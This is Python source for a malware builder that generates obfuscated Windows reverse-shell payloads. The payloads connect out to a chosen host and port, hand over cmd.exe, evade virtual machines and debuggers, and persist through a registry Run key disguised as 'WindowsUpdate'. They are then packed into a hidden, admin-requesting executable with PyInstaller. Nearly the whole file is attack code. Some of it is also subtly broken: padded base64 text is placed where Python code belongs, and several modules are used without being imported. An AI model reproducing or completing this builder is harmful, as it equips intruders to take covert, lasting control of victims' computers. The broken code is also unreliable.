import random
import string
import base64
import zlib
import marshal
import types
import re
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class PayloadGenerator:
    def __init__(self):
        self.encryption_key = Fernet.generate_key()
        
    def generate_random_string(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
    def obfuscate_string(self, s):
        # Convert string to bytes and encode
        encoded = base64.b64encode(s.encode()).decode()
        # Add random padding
        padding = self.generate_random_string(random.randint(5, 10))
        return f"{padding}{encoded}{padding[::-1]}"
        
    def deobfuscate_string(self, s):
        # Remove padding
        pattern = r'[a-zA-Z0-9]+([A-Za-z0-9+/=]+)[a-zA-Z0-9]+'
        match = re.search(pattern, s)
        if match:
            encoded = match.group(1)
            return base64.b64decode(encoded).decode()
        return s
        
    def encrypt_payload(self, payload):
        f = Fernet(self.encryption_key)
        return f.encrypt(payload.encode())
        
    def generate_stealth_payload(self, host, port):
        # Basic reverse shell template
        template = '''
import socket,subprocess,os,time,random,string,base64,hashlib,ctypes
from ctypes import windll, wintypes
import win32api,win32con,win32security,win32ts,win32net,win32netcon
import win32com.client
import wmi
import sys
import threading
import marshal
import types

def {random_func_name}():
    {obfuscated_socket_code}
    {obfuscated_process_code}
    {obfuscated_persistence_code}
    {obfuscated_anti_vm_code}
    {obfuscated_anti_debug_code}

if __name__ == '__main__':
    try:
        {random_func_name}()
    except:
        pass
'''
        
        # Generate random function name
        random_func_name = f"_{self.generate_random_string(8)}"
        
        # Obfuscate socket code
        socket_code = f'''
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
'''
        obfuscated_socket_code = self.obfuscate_string(socket_code)
        
        # Obfuscate process code
        process_code = '''
p=subprocess.Popen(["cmd.exe","-i"],stdin=s,stdout=s,stderr=s)
p.wait()
'''
        obfuscated_process_code = self.obfuscate_string(process_code)
        
        # Add anti-VM detection
        anti_vm_code = '''
def check_vm():
    try:
        wmi_obj = wmi.WMI()
        for item in wmi_obj.Win32_ComputerSystem():
            if any(x in item.Model.lower() for x in ['virtual', 'vmware', 'vbox']):
                return True
        return False
    except:
        return False

if check_vm():
    sys.exit(0)
'''
        obfuscated_anti_vm_code = self.obfuscate_string(anti_vm_code)
        
        # Add anti-debugging
        anti_debug_code = '''
def check_debugger():
    try:
        if windll.kernel32.IsDebuggerPresent():
            return True
        return False
    except:
        return False

if check_debugger():
    sys.exit(0)
'''
        obfuscated_anti_debug_code = self.obfuscate_string(anti_debug_code)
        
        # Add persistence
        persistence_code = '''
def add_persistence():
    try:
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except:
        pass
'''
        obfuscated_persistence_code = self.obfuscate_string(persistence_code)
        
        # Format the template
        payload = template.format(
            random_func_name=random_func_name,
            obfuscated_socket_code=obfuscated_socket_code,
            obfuscated_process_code=obfuscated_process_code,
            obfuscated_persistence_code=obfuscated_persistence_code,
            obfuscated_anti_vm_code=obfuscated_anti_vm_code,
            obfuscated_anti_debug_code=obfuscated_anti_debug_code
        )
        
        # Additional obfuscation
        payload = self.obfuscate_payload(payload)
        
        return payload
        
    def obfuscate_payload(self, payload):
        # Compile and marshal the code
        code = compile(payload, '<string>', 'exec')
        marshalled = marshal.dumps(code)
        
        # Create a wrapper that unmarshals and executes
        wrapper = f'''
import marshal,types
exec(marshal.loads({repr(marshalled)}))
'''
        
        # Add junk code and random variable names
        junk_code = self.generate_junk_code()
        wrapper = junk_code + wrapper
        
        # Compress the final payload
        compressed = zlib.compress(wrapper.encode())
        encoded = base64.b64encode(compressed).decode()
        
        # Create the final payload with decompression
        final_payload = f'''
import zlib,base64
exec(zlib.decompress(base64.b64decode("{encoded}")).decode())
'''
        
        return final_payload
        
    def generate_junk_code(self):
        # Generate random junk code to confuse analysis
        junk = []
        for _ in range(random.randint(5, 10)):
            var_name = f"_{self.generate_random_string(8)}"
            value = random.randint(1, 1000)
            junk.append(f"{var_name} = {value}")
            junk.append(f"if {var_name} > {value//2}:")
            junk.append(f"    {var_name} = {var_name} * 2")
        return "\n".join(junk) + "\n"
        
    def generate_exe(self, payload, output_path):
        # Convert Python payload to executable
        try:
            import PyInstaller.__main__
            
            # Create temporary Python file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(payload)
                temp_path = f.name
            
            # PyInstaller options for stealth
            options = [
                temp_path,
                '--onefile',
                '--noconsole',
                '--clean',
                f'--distpath={os.path.dirname(output_path)}',
                f'--workpath={os.path.join(os.path.dirname(output_path), "build")}',
                '--name=WindowsUpdate',
                '--icon=NONE',
                '--uac-admin',
                '--win-private-assemblies',
                '--win-no-prefer-redirects',
                '--key=WindowsUpdate',
                '--add-data=README.md;.',
                '--hidden-import=win32api',
                '--hidden-import=win32con',
                '--hidden-import=win32security',
                '--hidden-import=win32ts',
                '--hidden-import=win32net',
                '--hidden-import=win32netcon',
                '--hidden-import=win32com.client',
                '--hidden-import=wmi'
            ]
            
            PyInstaller.__main__.run(options)
            
            # Clean up
            os.unlink(temp_path)
            return True
            
        except Exception as e:
            print(f"Error generating executable: {str(e)}")
            return False 